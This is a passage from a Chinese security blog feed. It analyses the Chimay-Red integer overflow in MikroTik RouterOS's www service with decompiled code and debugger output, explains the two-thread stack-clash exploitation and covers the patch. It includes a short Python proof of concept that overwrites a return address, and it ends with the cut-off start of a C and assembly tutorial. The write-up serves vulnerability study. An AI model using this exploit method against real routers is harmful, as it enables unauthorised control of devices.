class="line">  <span class="keyword">if</span> ( !v3 || a3 &amp;&amp; a3 &lt; v9 )    <span class="comment">// jsproxy.p中, 传入的参数a3为0</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v4 = alloca(v9 + <span class="number">1</span>);</span><br><span class="line">  v5 = (_DWORD *)istream::read((istream *)(<span class="keyword">this</span> + <span class="number">8</span>), (<span class="keyword">char</span> *)&amp;v7, v9);</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>通过对<code>www</code>程序进行分析，针对每个新的连接，其会生成一个新线程来进行处理，而每个线程的栈空间大小为<code>0x20000</code>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main()</span></span><br><span class="line">stacksize = <span class="number">0</span>;</span><br><span class="line">pthread_attr_init(&amp;threadAttr);</span><br><span class="line">pthread_attr_setstacksize(&amp;threadAttr, <span class="number">0x20000</span>u);<span class="comment">// 设置线程栈空间大小</span></span><br><span class="line">pthread_attr_getstacksize(&amp;threadAttr, &amp;stacksize);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Looper::scheduleJob()</span></span><br><span class="line">pthread_cond_init((<span class="keyword">pthread_cond_t</span> *)(v6 + <span class="number">4</span>), <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> ( !pthread_create((<span class="keyword">pthread_t</span> *)v6, &amp;threadAttr, start_routine, v6) ) &#123;&#125;</span><br></pre></td></tr></table></figure><p><code>www</code>进程拥有自己的栈，创建的线程也会拥有自己的栈和寄存器，而<code>heap</code>、<code>code</code>等部分则是共享的。那各个线程的栈空间是从哪里分配的呢? 简单地讲，进程在创建线程时，线程的栈空间是通过<code>mmap(MAP_ANONYMOUS|MAP_STACK)</code>来分配的。同时，多个线程的栈空间在内存空间中是相邻的。</p><blockquote><p>Stack space for a new thread is created by the parent thread with <code>mmap(MAP_ANONYMOUS|MAP_STACK)</code>. So they’re in the “memory map segment”, as your diagram labels it. It can end up anywhere that a large <code>malloc()</code> could go. (glibc <code>malloc(3)</code> uses <code>mmap(MAP_ANONYMOUS)</code> for large allocations.) (<span class="exturl" data-url="aHR0cHM6Ly9zdGFja292ZXJmbG93LmNvbS9xdWVzdGlvbnMvNDQ4NTg1Mjgvd2hlcmUtYXJlLXRoZS1zdGFja3MtZm9yLXRoZS1vdGhlci10aHJlYWRzLWxvY2F0ZWQtaW4tYS1wcm9jZXNzLXZpcnR1YWwtYWRkcmVzcw==">来源<i class="fa fa-external-link-alt"></i></span>)</p></blockquote><p>结合上述知识，当<code>content-length</code>的值过小(为负数)或过大时，都会存在问题，下面分别对这2种情形进行分析。</p><h4 id="content-length的值过小-为负数"><a href="#content-length的值过小-为负数" class="headerlink" title="content-length的值过小(为负数)"></a>content-length的值过小(为负数)</h4><p>以<code>content-length=-1</code>为例，设置相应的断点后，构造数据包并发送。命中断点后查看对应的栈空间，可以看到，进程栈空间的起始范围为<code>0x7fc20000~0x7fc41000</code>，而当前线程栈空间的起始范围为<code>0x774ea000~0x77509000</code>，夹杂在映射的<code>lib</code>库中间。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; i threads</span><br><span class="line">  Id   Target Id         Frame</span><br><span class="line">  1    Thread 286.286 &quot;www&quot; 0x77513f64 in poll () from target:&#x2F;lib&#x2F;libc.so.0</span><br><span class="line">* 2    Thread 286.350 &quot;www&quot; 0x08055a53 in Request::readPostData(string&amp;, unsigned int)</span><br><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line"> 0x8048000  0x805c000 r-xp    14000 0      &#x2F;nova&#x2F;bin&#x2F;www</span><br><span class="line">&#x2F;&#x2F; ...</span><br><span class="line"> 0x805d000  0x8069000 rw-p     c000 0      [heap]</span><br><span class="line">0x774d7000 0x774db000 r-xp     4000 0      &#x2F;lib&#x2F;libucrypto.so</span><br><span class="line">&#x2F;&#x2F; ...</span><br><span class="line">0x774e9000 0x774ea000 ---p     1000 0</span><br><span class="line">0x774ea000 0x77509000 rw-p    1f000 0      &lt;&#x3D;&#x3D;&#x3D; 当前线程的栈空间</span><br><span class="line">0x77509000 0x7750a000 r--p     1000 0      &#x2F;nova&#x2F;etc&#x2F;www&#x2F;system.x3</span><br><span class="line">&#x2F;&#x2F; ...</span><br><span class="line">0x7fc20000 0x7fc41000 rw-p    21000 0      [stack]</span><br><span class="line">0xffffe000 0xfffff000 r-xp     1000 0      [vdso]</span><br><span class="line">pwndbg&gt; xinfo esp</span><br><span class="line">Extended information for virtual address 0x77508180:</span><br><span class="line"></span><br><span class="line">  Containing mapping:</span><br><span class="line">0x774ea000 0x77509000 rw-p    1f000 0</span><br><span class="line"></span><br><span class="line">  Offset information:</span><br><span class="line">         Mapped Area 0x77508180 &#x3D; 0x774ea000 + 0x1e180</span><br></pre></td></tr></table></figure><p>对应断点处的代码如下，其中<code>alloca()</code>变成了对应的内联汇编代码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;12i $eip</span><br><span class="line">&#x3D;&gt; 0x8055a53mov    edx,DWORD PTR [ebp-0x1c]&#x2F;&#x2F; 保存的是content-length的值</span><br><span class="line">   0x8055a56 lea    eax,[edx+0x10]&#x2F;&#x2F; 以下3行为与alloca()对应的汇编代码</span><br><span class="line">   0x8055a59and    eax,0xfffffff0</span><br><span class="line">   0x8055a5csub    esp,eax&#x2F;&#x2F; 计算后的eax为0,故esp不变</span><br><span class="line">   0x8055a5emov    edi,esp</span><br><span class="line">   0x8055a60push   eax</span><br><span class="line">   0x8055a61push   edx&#x2F;&#x2F; content-length的值, 为-1</span><br><span class="line">   0x8055a62push   edi</span><br><span class="line">   0x8055a63mov    eax,DWORD PTR [ebp+0x8]</span><br><span class="line">   0x8055a66lea    esi,[eax+0x20]</span><br><span class="line">   0x8055a69push   esi</span><br><span class="line">   0x8055a6acall   0x8050c40&#x2F;&#x2F; istream::read(char *,uint)</span><br></pre></td></tr></table></figure><p>由于<code>content-length=-1</code>，调用<code>alloca()</code>后栈空间未进行调整，之后在调用<code>istream::read()</code>时，由于传入的<code>size</code>参数为<code>-1</code>(即<code>0xffffffff</code>)，继续执行时会报错。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; c                                                                                 </span><br><span class="line">Thread 2 &quot;www&quot; received signal SIGSEGV, Segmentation fault.                               </span><br><span class="line">0x77569e0e in streambuf::xsgetn(char*, unsigned int) () from target:&#x2F;lib&#x2F;libuc++.so       </span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA                                         </span><br><span class="line">──────────────────────────[ REGISTERS ]──────────────────────────   </span><br><span class="line">*EDI  0x77509000 ◂— 0x75e                                                                 </span><br><span class="line">*ESI  0x8065ca7 ◂— 0x6168c08                                                             </span><br><span class="line">──────────────────────────[ DISASM ]────────────────────────────</span><br><span class="line"> ► 0x77569e0e    rep movsb byte ptr es:[edi], byte ptr [esi]                             </span><br></pre></td></tr></table></figure><p>在崩溃点<code>0x77569e90</code>处，<code>edi</code>的值为<code>0x77509000</code>，由于其指向的地址空间不可写，故出现<code>Segmentation fault</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x774ea000 0x77509000 rw-p    1f000 0      &lt;&#x3D;&#x3D;&#x3D; 当前线程的栈空间</span><br><span class="line">0x77509000 0x7750a000 r--p     1000 0      &#x2F;nova&#x2F;etc&#x2F;www&#x2F;system.x3</span><br></pre></td></tr></table></figure><p>注意到在调用<code>istream::read()</code>时，传入的第一个参数为当前的栈指针<code>esp</code>(其指向的空间用于保存读取的内容)，在读取的过程中会覆盖栈上的内容，当然也包括返回地址(如执行完<code>Request::readPostData()</code>后的返回地址)。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;wx $esp</span><br><span class="line">0x77508180:     0x77508208</span><br><span class="line">pwndbg&gt; x&#x2F;4wx $ebp</span><br><span class="line">0x775081a8:     0x77508238      0x774e0e69 &lt;&#x3D;&#x3D;&#x3D;返回地址      0x77508328      0x775081f4</span><br></pre></td></tr></table></figure><p>因此，有没有可能在这个过程中进行利用呢? 如果想要进行利用，大概需要满足如下条件。</p><ul><li><code>content-length</code>的值在<code>0x7ffffff0~0xffffffff</code>范围内  (使线程的栈空间向高地址方向增长)</li><li>在调用<code>istream::read()</code>时，在读取请求体中的部分数据后，能使其提前返回</li></ul><p>由于<code>\x00</code>不会影响<code>istream::read()</code>，而只有当读到文件末尾时才会提前结束，否则会一直读取直到读取完指定大小的数据。在测试时发现，无法满足上述条件，因此在这个过程中没法利用。</p><blockquote><p><code>Chimay-Red</code>中通过关闭套接字的方式使<code>istream::read()</code>提前返回，但并没有读取请求体中的数据。如果有其他的方式，欢迎交流:)</p></blockquote><h4 id="content-length的值过大"><a href="#content-length的值过大" class="headerlink" title="content-length的值过大"></a>content-length的值过大</h4><p>根据前面可知，当<code>content-length</code>的值过大时(<code>&gt;0x20000</code>)，在<code>Request::readPostData()</code>中，会对线程的栈空间进行调整，使得当前线程栈指针<code>esp</code>“溢出”(即指向与当前线程栈空间相邻的低地址区域)。同样在执行后续指令时，由于<code>esp</code>指向的某些地址空间不可写，也会出现<code>Segmentation fault</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line"> 0x8048000  0x805c000 r-xp    14000 0      &#x2F;nova&#x2F;bin&#x2F;www</span><br><span class="line"> 0x805c000  0x805d000 rw-p     1000 14000  &#x2F;nova&#x2F;bin&#x2F;www</span><br><span class="line"> 0x805d000  0x8069000 rw-p     c000 0      [heap]</span><br><span class="line">0x774d7000 0x774db000 r-xp     4000 0      &#x2F;lib&#x2F;libucrypto.so</span><br><span class="line">0x774db000 0x774dc000 rw-p     1000 3000   &#x2F;lib&#x2F;libucrypto.so</span><br><span class="line">0x774dc000 0x774e6000 r-xp     a000 0      &#x2F;nova&#x2F;lib&#x2F;www&#x2F;jsproxy.p</span><br><span class="line">0x774e6000 0x774e7000 rw-p     1000 a000   &#x2F;nova&#x2F;lib&#x2F;www&#x2F;jsproxy.p    (使esp&quot;溢出&quot;到这里)</span><br><span class="line">0x774e9000 0x774ea000 ---p     1000 0</span><br><span class="line">0x774ea000 0x77509000 rw-p    1f000 0   &lt;&#x3D;&#x3D;&#x3D; 当前线程的栈空间</span><br><span class="line">0x77509000 0x7750a000 r--p     1000 0      &#x2F;nova&#x2F;etc&#x2F;www&#x2F;system.x3</span><br></pre></td></tr></table></figure><p>在这个过程中是否可以进行利用呢? 通过向低地址方向调整当前线程的<code>esp</code>指针，比如使其溢出到<code>0x774e6000 ~0x774e7000</code>，然后再修改某些地址处的内容，但还是无法使得<code>istream::read()</code>在读取部分内容后提前返回，同样会出现类似的错误。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p><code>Chimay-Red</code>中通过堆叠两个线程栈空间的方式完成了漏洞利用。前面提到，针对每个新的连接，都会创建一个新的线程进行处理，而新创建的线程会拥有自己的栈空间，其大小为<code>0x20000</code>。同时，多个线程的栈空间在地址上是相邻的，起始地址间隔为<code>0x20000</code>。如果能够使某个线程的栈指针<code>esp</code>“下溢”到其他线程的栈空间内，由于栈空间内会包含返回地址等，便可以通过构造payload覆盖对应的返回地址，从而实现劫持程序控制流的目的。下面对该思路进行具体分析。</p><p>首先，与服务<code>www</code>建立两个连接，创建的两个线程的栈空间初始状态如下。</p><img data-src="images/exploit_flow_1.png" style="zoom:80%"><p>然后，<code>client1</code>发送<code>HTTP</code>请求头，其中<code>content-length</code>的值为<code>0x20900</code>。在对应的<code>thread1</code>中，先对当前栈指针<code>esp</code>进行调整，然后调用<code>istream::read()</code>读取请求体数据，对应的栈空间状态如下。由于此时还未发送<code>HTTP</code>请求体，因此<code>thread1</code>在某处等待。</p><img data-src="images/exploit_flow_2.png" style="zoom:80%"><p>同样，<code>client2</code>发送<code>HTTP</code>请求头，其中<code>content-length</code>的值为<code>0x200</code>。类似地，在对应的<code>thread2</code>中，先对当前栈指针<code>esp</code>进行调整，然后调用<code>istream::read()</code>读取请求体数据，对应的栈空间状态如下。由于此时还未发送<code>HTTP</code>请求体，<code>thread2</code>也在某处等待。</p><img data-src="images/exploit_flow_3.png" style="zoom:80%"><p>之后，<code>client1</code>发送<code>HTTP</code>请求体，在<code>thread1</code>中读取发送的数据，并将其保存在<code>thread1</code>的<code>esp(1)</code>指向的内存空间中。当发送的数据长度足够长时，保存的内容将覆盖<code>thread2</code>栈上的内容，包括函数指针、返回地址等。例如当长度为<code>0x20910-0x210-0x14</code>时，将覆盖函数<code>istream::read()</code>执行完后的返回地址。实际上，当<code>thread2</code>执行<code>istream::read()</code>时，对应的栈指针<code>esp(2)</code>将继续下调，以便为函数开辟栈帧。同时由于函数<code>isteam::read()</code>内会调用其他函数，因此也会有其他的返回地址保存在栈上。经过测试，<code>client1</code>发送的<code>HTTP</code>请求体数据长度超过<code>0x54c</code>时，就可以覆盖<code>thread2</code>栈上的某个返回地址。</p><blockquote><p>在这个例子中，<code>0x54c</code> 是通过<code>cyclic pattern</code>方式确定的。</p></blockquote><img data-src="images/exploit_flow_4.png" style="zoom:80%"><p>此时，<code>thread2</code>仍然在等待<code>client2</code>的数据，<code>client2</code>通过关闭连接，即可使对应的函数返回。由于对应的返回地址已被覆盖，从而达到劫持控制流的目的。</p><p>参考<code>Chimay-Red</code>工具中的<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0JpZ05lcmQ5NS9DaGltYXktUmVkL2Jsb2IvbWFzdGVyL1BPQ3MvU3RhY2tDbGFzaFBPQy5weQ==">StackClashPOC.py<i class="fa fa-external-link-alt"></i></span>，对应上述流程的代码如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 可参考StackClashPOC.py中详细的注释</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stackClash</span>(<span class="params">ip</span>):</span></span><br><span class="line">    s1 = makeSocket(ip, <span class="number">80</span>) <span class="comment"># client1, thread1</span></span><br><span class="line">    s2 = makeSocket(ip, <span class="number">80</span>) <span class="comment"># client2, thread2</span></span><br><span class="line"></span><br><span class="line">    socketSend(s1, makeHeader(<span class="number">0x20900</span>)) </span><br><span class="line">    socketSend(s2, makeHeader(<span class="number">0x200</span>)) </span><br><span class="line">    socketSend(s1, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x54c</span>+ struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="number">0x13371337</span>))<span class="comment"># ROP chain address</span></span><br><span class="line">    s2.close() </span><br></pre></td></tr></table></figure><p>需要说明的是，<code>Chimay-Red</code>工具中的流程与上述流程存在细微的区别，其实质在于<code>thread1</code>保存请求体数据的操作与<code>thread2</code>为执行<code>isteam::read()</code>函数开辟栈空间的操作的先后顺序。</p><p>在能够劫持控制流后，后续的利用就比较简单了，常用的思路如下。</p><ul><li><p>注入<code>shellcode</code>，然后跳转到<code>shellcode</code>执行</p></li><li><p>调用<code>system()</code>执行<code>shell</code>命令</p><ul><li><p>当前程序存在<code>system()</code>，直接调用即可</p></li><li><p>当前程序不存在<code>system()</code>：寻找合适的<code>gadgets</code>，通过修改<code>got</code>的方式实现 </p><blockquote><p><code>Chimay-Red</code>工具: 由于<code>www</code>程序中存在<code>dlsym()</code>，可通过调用<code>dlsym(0,&quot;system&quot;)</code>的方式查找<code>system()</code> </p></blockquote></li></ul></li></ul><h3 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h3><p>在<code>6.38.5</code>版本中对该漏洞进行了修复，对应的<code>Request::readPostDate()</code>函数的部分伪代码如下。其中，1) 在调用该函数时，传入的<code>a3</code>参数为<code>0x20000</code>，因此会对<code>content-length</code>的大小进行限制；2) 读取的数据保存在string类型中，即将数据保存在堆上。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> <span class="title">Request::readPostData</span><span class="params">(Request *<span class="keyword">this</span>, <span class="built_in">string</span> *a2, <span class="keyword">unsigned</span> <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">string</span>::<span class="built_in">string</span>((<span class="built_in">string</span> *)&amp;v6, <span class="string">&quot;content-length&quot;</span>);</span><br><span class="line">  v3 = Headers::getHeader((Headers *)<span class="keyword">this</span>, (<span class="keyword">const</span> <span class="built_in">string</span> *)&amp;v6, &amp;v7);</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a3 &gt;= v7 )    <span class="comment">// jsproxy.p中, 传入的参数a3为0x20000</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">string</span>::<span class="built_in">string</span>((<span class="built_in">string</span> *)&amp;v6);</span><br><span class="line">      wrap_str_assign(a2, (<span class="keyword">const</span> <span class="built_in">string</span> *)&amp;v6);</span><br><span class="line">      <span class="built_in">string</span>::~<span class="built_in">string</span>((<span class="built_in">string</span> *)&amp;v6);</span><br><span class="line">      <span class="built_in">string</span>::resize(a2, v7, <span class="number">0</span>);   <span class="comment">// 使用sting类型来保存数据</span></span><br><span class="line">      v5 = istream::read((istream *)(<span class="keyword">this</span> + <span class="number">8</span>), (<span class="keyword">char</span> *)(*(_DWORD *)a2 + <span class="number">4</span>), v7);</span><br><span class="line">   <span class="comment">// ...</span></span><br></pre></td></tr></table></figure><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><ul><li>漏洞形成的原因为：在获取<code>HTTP</code>请求头中<code>content-length</code>值后，未对其进行有效校验，造成后续存在整数溢出问题；</li><li><code>Chimay-Red</code>工具中通过堆叠两个线程栈空间的方式完成漏洞利用。</li></ul><h3 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h3><ul><li><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLnNlZWtpbnRvby5jb20vY2hpbWF5LXJlZC8=">Chimay-Red<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0JpZ05lcmQ5NS9DaGltYXktUmVk">Chimay-Red: Working POC of Mikrotik exploit from Vault 7 CIA Leaks<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMTk1NzY3">Chimay-Red: RouterOS Integer Overflow Analysis<i class="fa fa-external-link-alt"></i></span></li></ul><br/><blockquote><p>本文首发于安全客，文章链接：<span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMjAwMDg3">https://www.anquanke.com/post/id/200087<i class="fa fa-external-link-alt"></i></span></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mikrotik </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C与汇编语言混合使用</title>
      <link href="2020/01/13/C%E4%B8%8E%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E6%B7%B7%E5%90%88%E4%BD%BF%E7%94%A8/"/>
      <url>2020/01/13/C%E4%B8%8E%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E6%B7%B7%E5%90%88%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在某些情况下，我们可能会将C代码与汇编代码一起混合使用。比如，使用汇编代码直接与硬件进行交互，或者在处理任务时希望占用尽量少的资源同时获得最大的性能，而使用C代码处理一些更高级 的任务。通常情况下，混合使用C与汇编可分为以下三种情形：</p><ul><li>在C中调用汇编中定义的函数</li><li>在汇编中调用C语言中的函数</li><li>直接在C语言中嵌入汇编</li></ul><a id="more"></a><p>在介绍C与汇编混合使用之前，先介绍一下在Linux系统中进行系统调用时传参的约定，以及在进行函数调用时的传参约定。</p><h3 id="Linux-系统调用约定"><a href="#Linux-系统调用约定" class="headerlink" title="Linux 系统调用约定"></a>Linux 系统调用约定</h3><p><strong>系统调用</strong>是用户程序与Linux 内核之间的接口，用于让内核执行一些系统任务，如文件访问、进程管理及网络任务等。在Linux中，有多种方式可以用于进行系统调用，这里只介绍通过使用<code>int $0x80</code>或<code>syscall</code>产生软中断来进行系统调用的方式。该方法比较简单直观，方便在汇编代码中进行系统调用。</p><h4 id="int-0x80"><a href="#int-0x80" class="headerlink" title="int $0x80"></a>int $0x80</h4><p>在Linux x86 和Linux x86_64中，可以直接使用<code>int $0x80</code>命令来进行系统调用。以Linux x86为例，参数传递规则如下，其中返回值通过寄存器eax返回。</p><table><thead><tr><th align="center">系统调用号</th><th align="center">参数1</th><th align="center">参数2</th><th align="center">参数3</th><th align="center">参数4</th><th align="center">参数5</th><th align="center">参数6</th><th align="center">返回值</th></tr></thead><tbody><tr><td align="center">eax</td><td align="center">ebx</td><td align="center">ecx</td><td align="center">edx</td><td align="center">esi</td><td align="center">edi</td><td align="center">ebp</td><td align="center">eax</td></tr></tbody></table><p>系统调用号可以在<code>/usr/include/asm/unistd_32.h</code>文件中查看。在系统调用过程中，所有寄存器的值都会保持不变(除了<code>eax</code>用于返回值)。</p><blockquote><p>由于在Linux x86_64上，寄存器的名称发生了变化，其参数传递规则见下面</p></blockquote><h4 id="syscall"><a href="#syscall" class="headerlink" title="syscall"></a>syscall</h4><p>在Linux x86_64中引入了一条新的指令<code>syscall</code>，与<code>int $0x80</code>相比，由于不需要访问中断描述符表，所以会更快。其参数传递规则如下，其中返回值通过寄存器rax返回。</p><table><thead><tr><th align="center">系统调用号</th><th align="center">参数1</th><th align="center">参数2</th><th align="center">参数3</th><th align="center">参数4</th><th align="center">参数5</th><th align="center">参数6</th><th align="center">返回值</th></tr></thead><tbody><tr><td align="center">rax</td><td align="center">rdi</td><td align="center">rsi</td><td align="center">rdx</td><td align="center">r10</td><td align="center">r8</td><td align="center">r9</td><td align="center">rax</td></tr></tbody></table><p>系统调用号可以在<code>/usr/include/asm/unistd_64.h</code>文件中查看。在系统调用过程中，会改变寄存器<code>rcx</code>和<code>r11</code>的内容，其他寄存器的内容会保持不变(除了<code>rax</code>用于返回值)。</p><h3 id="函数调用传参约定"><a href="#函数调用传参约定" class="headerlink" title="函数调用传参约定"></a>函数调用传参约定</h3><p>在Linux x86中，使用gcc编译器进行程序编译时，函数调用时的参数传递规则如下：</p><ul><li>函数参数通过栈传递，按照从右往左的顺序入栈；</li><li>函数返回值保存在寄存器<code>eax</code>中。</li></ul><p>在Linux x86_64中，函数调用时的参数传递规则如下：</p><ul><li>前6个参数按从左往右的顺序分别通过寄存器<code>rdi</code>、<code>rsi</code>、<code>rdx</code>、<code>rcx</code>、<code>r8</code>、<code>r9</code>，剩下的参数按从右往左的顺序通过栈传递；</li><li>函数返回值保存在寄存器<code>rax</code>中。</li></ul><blockquote><p>函数调用时的参数传递规则实际上与<strong>函数调用约定</strong>有关，与编译器无关，常见的函数调用约定包括<code>c调用约定</code>、<code>std调用约定</code>、<code>x86 fastcall约定</code>以及<code>C++调用约定</code>等。gcc编译器采用的c调用约定。</p></blockquote><h3 id="在C中调用汇编中定义的函数"><a href="#在C中调用汇编中定义的函数" class="headerlink" title="在C中调用汇编中定义的函数"></a>在C中调用汇编中定义的函数</h3><p>以Linux x86为例，用汇编语言编写一个hello_world函数，输出”Hello, World!\n”为例，其不需要任何参数，同时也没有返回值，相应的汇编代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.globl hello_world</span><br><span class="line">.type hello_world, @function</span><br><span class="line">.section .data</span><br><span class="line">message: .ascii &quot;Hello, World!\n&quot;</span><br><span class="line">length: .int . - message</span><br><span class="line">.section .text</span><br><span class="line">hello_world:</span><br><span class="line">  mov $4, %eax</span><br><span class="line">  mov $1, %ebx</span><br><span class="line">  mov $message, %ecx</span><br><span class="line">  mov length, %edx</span><br><span class="line">  int $0x80</span><br><span class="line">  ret</span><br></pre></td></tr></table></figure><blockquote><p>由于使用gcc进行编译，因此汇编代码中使用AT&amp;T语法。如果在用gcc编译时加上<code>-masm=intel</code>选项，则可以使用intel语法。当然，也可以使用nasm对汇编语言进行汇编，然后使用gcc完成链接过程，可参考<span class="exturl" data-url="aHR0cHM6Ly93d3cuZGV2ZHVuZ2Vvbi5jb20vY29udGVudC9ob3ctbWl4LWMtYW5kLWFzc2VtYmx5">这里<i class="fa fa-external-link-alt"></i></span>。</p></blockquote><p>然后编写一个C程序调用该函数，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">void</span> <span class="title">hello_world</span><span class="params">()</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  hello_world();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用gcc进行编译，命令如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 hello_world.c hello_world.s -o hello_world</span><br></pre></td></tr></table></figure><p>下面通过参数传递将”Hello World!”传入到汇编代码中，修改如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.globl hello_world</span><br><span class="line">.type hello_world, @function</span><br><span class="line">.section .text</span><br><span class="line">hello_world:</span><br><span class="line">  mov $4, %eax</span><br><span class="line">  mov $1, %ebx</span><br><span class="line">  mov 4(%esp), %ecx</span><br><span class="line">  mov $0xd, %edx</span><br><span class="line">  int $0x80</span><br><span class="line">  ret</span><br></pre></td></tr></table></figure><p>对应的C程序如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">extern void hello_world(char* value);</span><br><span class="line"> </span><br><span class="line">void 